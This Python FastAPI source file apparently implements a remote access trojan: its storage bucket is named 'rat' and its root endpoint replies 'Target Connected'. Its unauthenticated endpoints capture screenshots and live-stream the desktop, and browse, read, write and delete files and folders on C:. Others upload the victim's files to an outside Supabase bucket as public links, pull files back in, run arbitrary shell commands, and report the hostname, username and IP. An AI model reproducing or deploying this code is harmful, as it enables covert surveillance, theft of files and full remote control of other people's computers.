import os
import shutil
import subprocess
import time
from pathlib import Path

import cv2
import numpy as np
from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack
from av import VideoFrame
from dotenv import load_dotenv
from fastapi import BackgroundTasks, FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, StreamingResponse
from mss import mss
from supabase import Client, create_client

load_dotenv()

supabase: Client = create_client(
    os.getenv("SUPABASE_URL"),
    os.getenv("SUPABASE_KEY"),
)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
def read_root():
    return "Target Connected"


def cleanup_sc():
    if os.path.exists("sc.png"):
        os.remove("sc.png")


@app.get("/screenshot")
def sc(bg_task: BackgroundTasks):

    bg_task.add_task(cleanup_sc)

    with mss() as s:
        s.shot(output="sc.png")

    return FileResponse("sc.png", media_type="image/jpeg")


@app.get("/getdir")
def get_dir(path: str = ""):

    try:
        files = os.listdir(f"C:/{path}")
        return files
    except FileNotFoundError:
        return "folder not found"


class DesktopTrack(VideoStreamTrack):
    def __init__(self):
        super().__init__()
        self.sct = mss()
        self.monitor = self.sct.monitors[1]

    async def recv(self):
        pts, time_base = await self.next_timestamp()

        img = np.array(self.sct.grab(self.monitor))
        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

        frame = VideoFrame.from_ndarray(img, format="bgr24")
        frame.pts = pts
        frame.time_base = time_base

        return frame


pcs = set()


@app.post("/offer")
async def stream_screen(params: dict):
    pc = RTCPeerConnection()
    pcs.add(pc)

    @pc.on("connectionstatechanged")
    async def on_connectionstatechanged():
        if pc.connectionState in ("failed", "closed", "disconected"):
            await pc.close()
            pcs.discard(pc)

    await pc.setRemoteDescription(
        RTCSessionDescription(sdp=params.get("sdp"), type=params.get("type"))
    )

    pc.addTrack(DesktopTrack())

    answer = await pc.createAnswer()
    await pc.setLocalDescription(answer)

    return {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}


@app.get("/readfile")
def readfile(path: str = ""):
    with open(f"C:/{path}", "r") as f:
        return f.read()


@app.get("/createfile")
def createfile(path: str, content: str):
    Path(f"C:/{path}").touch()

    with open(f"C:/{path}", "w") as f:
        return f.write(content)


@app.get("/removefile")
def removefile(path: str):
    try:
        os.remove(f"C:/{path}")
        return "file deleted"
    except FileNotFoundError:
        return "file not found"


@app.get("/removefolder")
def removefolder(path: str):
    try:
        shutil.rmtree(f"C:/{path}")
        return "folder removed"
    except FileNotFoundError:
        return "folder not found"


# SHOULD BE HANDLED BETTER FOR LARGE FILES #
@app.get("/downloadfile")
def downloadfile(path: str):
    file_name = Path(path).name
    try:
        with open(f"C:/{path}", "rb") as f:
            _ = supabase.storage.from_("rat").upload(
                file=f,
                path=f"./public/{file_name}",
                file_options={"cache-control": "3600", "upsert": "true"},
            )

            url = supabase.storage.from_("rat").get_public_url(f"/public/{file_name}")

            return url

    except Exception as e:
        return f"Error: {str(e)}"


@app.get("/uploadfile")
def uploadfile(dwpath: str, dbfilename: str):
    try:
        with open(f"C:/{dwpath}", "wb+") as f:
            response = supabase.storage.from_("rat").download(f"public/{dbfilename}")
            f.write(response)

            return "file uploaded"

    except Exception as e:
        return f"Error: {str(e)}"


@app.get("/cmd")
def run_cmd(cmd: str, path: str = ""):

    try:
        r = subprocess.run(
            f"{cmd}",
            shell=True,
            capture_output=True,
            cwd=f"C:/{path}",
            check=True,
            text=True,
        )

        return {"stderr": r.stderr, "stdout": r.stdout, "code": r.returncode}

    except subprocess.CalledProcessError as e:
        return f"Command failed with exit code {e.returncode}"


@app.get("/sysinfo")
def get_system_info():
    try:
        import platform
        import socket

        import psutil

        return {
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(logical=True),
            "cpu_physical": psutil.cpu_count(logical=False),
            "cpu_percent": psutil.cpu_percent(interval=0.5),
            "ram_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "ram_available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
            "ram_percent": psutil.virtual_memory().percent,
            "disk_total_gb": round(psutil.disk_usage("C:/").total / (1024**3), 2),
            "disk_free_gb": round(psutil.disk_usage("C:/").free / (1024**3), 2),
            "disk_percent": psutil.disk_usage("C:/").percent,
            "boot_time": psutil.boot_time(),
            "username": os.getlogin(),
            "ip": socket.gethostbyname(socket.gethostname()),
        }
    except Exception as e:
        return f"error: {str(e)}"
